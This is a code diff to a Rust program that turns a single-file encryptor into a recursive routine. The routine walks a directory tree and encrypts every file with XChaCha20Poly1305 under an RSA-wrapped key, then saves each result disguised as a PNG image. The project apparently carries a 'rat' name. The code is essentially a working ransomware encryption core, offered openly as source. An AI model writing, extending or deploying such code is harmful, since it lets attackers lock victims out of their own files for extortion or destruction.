@@ -1,5 +1,7 @@
 use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
+use std::path::{Path, PathBuf};
+use anyhow::Context;
 use chacha20poly1305::aead::OsRng;
 use chacha20poly1305::aead::stream::EncryptorBE32;
 use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
@@ -11,30 +13,26 @@ use crate::BIGRAT_PNG;
 
 const BUFFER_SIZE: usize = 500;
 
-pub fn encrypt_file(
+fn encrypt_file(
     source_file: &mut File,
-    public_key: RsaPublicKey,
-    rng: &mut ThreadRng,
+    dist_path: &Path,
+    encrypted_key: &[u8],
+    encrypted_nonce: &[u8],
+    aead: XChaCha20Poly1305,
+    nonce: &[u8],
 ) -> anyhow::Result<()> {
     let mut dist_file = OpenOptions::new()
         .append(true)
         .create(true)
-        .open("/home/rafal/boykisser-rat.png")?;
+        .open(dist_path)
+        .with_context(|| format!("Failed to create or open a destination file {}", dist_path.display()))?;
 
     dist_file.set_len(0)?;
     dist_file.write_all(BIGRAT_PNG)?;
 
-    let mut key = [0u8; 32];
-    let mut nonce = [0u8; 19];
-    OsRng.fill_bytes(&mut key);
-    OsRng.fill_bytes(&mut nonce);
+    dist_file.write_all(encrypted_key)?;
+    dist_file.write_all(encrypted_nonce)?;
 
-    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)?;
-    dist_file.write_all(encrypted_key.as_slice())?;
-    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)?;
-    dist_file.write_all(encrypted_nonce.as_slice())?;
-
-    let aead = XChaCha20Poly1305::new(key.as_ref().into());
     let mut stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());
 
     let mut buffer = [0u8; BUFFER_SIZE];
@@ -50,5 +48,49 @@ pub fn encrypt_file(
         }
     }
 
+    Ok(())
+}
+
+pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut ThreadRng) -> anyhow::Result<()> {
+    let mut key = [0u8; 32];
+    let mut nonce = [0u8; 19];
+    OsRng.fill_bytes(&mut key);
+    OsRng.fill_bytes(&mut nonce);
+
+    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)
+        .with_context(|| "Failed to encrypt the key")?;
+    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)
+        .with_context(|| "Failed to encrypt the nonce")?;
+
+    let aead = XChaCha20Poly1305::new(key.as_ref().into());
+
+    for entry in path.read_dir()? {
+        let entry = entry?;
+        if entry.file_type()?.is_dir() {
+            encrypt_everything(&entry.path(), public_key, rng)?;
+        } else {
+            let mut file = match File::open(entry.path()) {
+                Ok(file) => file,
+                Err(e) => {
+                    eprintln!("Failed to open file {}: {}", entry.path().display(), e);
+                    continue;
+                },
+            };
+
+            // TODO: Check if that file already exists
+            let new_path = PathBuf::from(&format!("{}.png", entry.path().display()));
+            if let Err(e) = encrypt_file(
+                &mut file,
+                &new_path,
+                encrypted_key.as_slice(),
+                encrypted_nonce.as_slice(),
+                aead.clone(),
+                nonce.as_ref(),
+            ) {
+                eprintln!("Failed to encrypt a file {}: {}", entry.path().display(), e);
+                continue;
+            };
+        }
+    }
     Ok(())
 }
